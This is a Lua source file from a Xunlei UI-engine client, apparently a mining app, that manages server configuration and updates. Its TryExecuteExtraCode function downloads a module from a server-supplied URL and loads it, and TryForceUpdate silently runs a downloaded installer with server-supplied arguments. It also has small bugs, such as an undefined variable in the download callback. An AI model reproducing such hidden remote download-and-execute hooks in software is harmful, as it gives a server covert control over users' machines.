local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local timeMgr = XLGetObject("Xunlei.UIEngine.TimerManager")
local tFunctionHelper = XLGetGlobal("FunctionHelper")

--local g_ServerConfig = {} 
--XLSetGlobal("g_ServerConfig", g_ServerConfig)

ObjectBase = XLGetGlobal("ObjectBase")
ServerCfg = ObjectBase:New()
XLSetGlobal("ServerCfg", ServerCfg)


ServerCfg._bIsUpdating = false
ServerCfg._ServerConfig = {}

function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end

function TipLog(strLog)
	tipUtil:Log("ServerCfg: " .. tostring(strLog))
end
function ServerCfg:GetServerCfgData(tabPath)
	return tFunctionHelper.FetchValueByPath(self._ServerConfig, tabPath)
end

function ServerCfg:GetLocalServerCfgData(tabPath)
	local tUserConfig = tFunctionHelper.ReadConfigFromMemByKey("tUserConfig") or {}
	if type(tUserConfig["tServerConfig"]) ~= "table" then
		tUserConfig["tServerConfig"] = {}
	end
	return tFunctionHelper.FetchValueByPath(tUserConfig["tServerConfig"], tabPath)
end

function ServerCfg:SaveServerCfgtoLocal()
	local tUserConfig = tFunctionHelper.ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["tServerConfig"] = {}
	if type(self._ServerConfig["tReportInfo"]) == "table" then
		tUserConfig["tServerConfig"]["tReportInfo"] = self._ServerConfig["tReportInfo"]
	else
		tUserConfig["tServerConfig"]["tReportInfo"] = nil
	end
	if type(self._ServerConfig["tServerInterfaceCfg"]) == "table" then
		tUserConfig["tServerConfig"]["tServerInterfaceCfg"] = self._ServerConfig["tServerInterfaceCfg"]
	else
		tUserConfig["tServerConfig"]["tServerInterfaceCfg"] = nil
	end
	if type(self._ServerConfig["tRemindCfg"]) == "table" then
		tUserConfig["tServerConfig"]["tRemindCfg"] = self._ServerConfig["tRemindCfg"]	
	else
		tUserConfig["tServerConfig"]["tRemindCfg"] = nil
	end
	tFunctionHelper.SaveConfigToFileByKey("tUserConfig")
end

function ServerCfg:CheckIsUpdating()
	return self._bIsUpdating
end

function ServerCfg:SetIsUpdating(bIsUpdating)
	if type(bIsUpdating) == "boolean" then
		self._bIsUpdating = bIsUpdating
	end
end

function ServerCfg:TryForceUpdate()
	if self:CheckIsUpdating() then
		TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end
	
	local bPassCheck = tFunctionHelper.CheckCommonUpdateTime(1)
	if not bPassCheck then
		TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = self._ServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		return 
	end
	
	local strCurVersion = tFunctionHelper.GetGXZBVersion()
	--local versionInfo = CheckCondition(tForceUpdate)
	local strNewVersion = tForceUpdate.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not tFunctionHelper.CheckIsNewVersion(strNewVersion, strCurVersion) then
		TipLog("[TryForceUpdate] strCurVersion is nil or is not New Version")
		return
	end
	
	local tVersionLimit = tForceUpdate["tVersion"]
	local bPassCheck = tFunctionHelper.CheckForceVersion(tVersionLimit)
	TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return 
	end
	
	self:SetIsUpdating(true)
	tFunctionHelper.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
		self.SetIsUpdating(false)
		if not IsRealString(strRealPath) then
			TipLog("[TryForceUpdate] download fail")
			return
		end
		
		tFunctionHelper.SaveCommonUpdateUTC()
		local strCmd = " /write /s"
		if IsRealString(tForceUpdate["strCmd"]) then
			strCmd = strCmd.." "..tForceUpdate["strCmd"]
		end
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
		--Statistic:SendUIReport("updateclinet","auto")
	end)
end


function ServerCfg:TryExecuteExtraCode()
	local tExtraHelper = self._ServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	
	if not IsRealString(strURL) then
		return
	end
	
	local bPassCheck = tFunctionHelper.CheckForceVersion(tExtraHelper["tVersion"])
	tFunctionHelper.TipLog("[TryExecuteExtraCode] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return
	end
	
	local strHelperName = tFunctionHelper.GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	local strStamp = tFunctionHelper.GetTimeStamp()
	local strURLFix = strURL..strStamp
	
	tFunctionHelper.DownLoadFileWithCheck(strURLFix, strSavePath, strMD5
	, function(bRet, strRealPath)
		TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL).."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))		
		if bRet < 0 then
			return
		end
		TipLog("[TryExecuteExtraCode] begin execute extra helper: "..tostring(strRealPath))
		XLLoadModule(strRealPath)
	end)	
end

function ServerCfg:OnDownLoadSvrCfgFinish(event, strServerPath)
	self:RemoveListener("OnDownLoadSvrCfgFinish", self.OnDownLoadSvrCfgFinish, self)
	if strServerPath ~= nil then
		TipLog("[OnDownLoadSvrCfgFinish] download server config success")
		--Statistic:StartRunCountTimer()
		if UIInterface:CheckShouldRemindBind() then
			UIInterface:ChangeMainBodyPanel("QRCodePanel")
			UIInterface:SaveLastRemindBindUTC()
		end
		local tServerConfig = tFunctionHelper.LoadTableFromFile(strServerPath) or {}
		
		self._ServerConfig = tServerConfig
		--保存配置到本地
		self:SaveServerCfgtoLocal()
		--4小时1次提醒
		UIInterface:PopTipPre4Hour()
		self:TryExecuteExtraCode()
		--增加处理/noliveup命令行
		--升级提醒
		local bPopRemind = UIInterface:PopRemindUpdateWnd()
		if not bPopRemind then
			SetOnceTimer(function()
							local cmdString = tipUtil:GetCommandLine()
							local bRet = string.find(string.lower(tostring(cmdString)), "/noliveup")
							if not bRet then
								TipLog("[OnDownLoadSvrCfgFinish] TryForceUpdate")
								self:TryForceUpdate()
							else
								TipLog("[OnDownLoadSvrCfgFinish] bRet")
							end
						end, 1000)
		end
	else
		TipLog("[OnDownLoadSvrCfgFinish] download server config fail")
		SetOnceTimer(function()
						TipLog("[OnDownLoadSvrCfgFinish] retray download server config")
						self:TryToConnectServer()
					end, 60*1000)
	end
	
end

--尝试去连接服务器获取更新信息
function ServerCfg:TryToConnectServer()
	local function fnDownLoadCallBack(nRet, strServerCfgPath)
		if nRet ~= 0 
			or not IsRealString(strServerPath) 
			or not tipUtil:QueryFileExists(tostring(strServerCfgPath)) then
			self:DispatchEvent("OnDownLoadSvrCfgFinish", strServerCfgPath)
		else
			self:DispatchEvent("OnDownLoadSvrCfgFinish", strServerCfgPath)
		end
	end
	self:AddListener("OnDownLoadSvrCfgFinish", self.OnDownLoadSvrCfgFinish, self)
	tFunctionHelper.DownLoadServerConfig(fnDownLoadCallBack)
end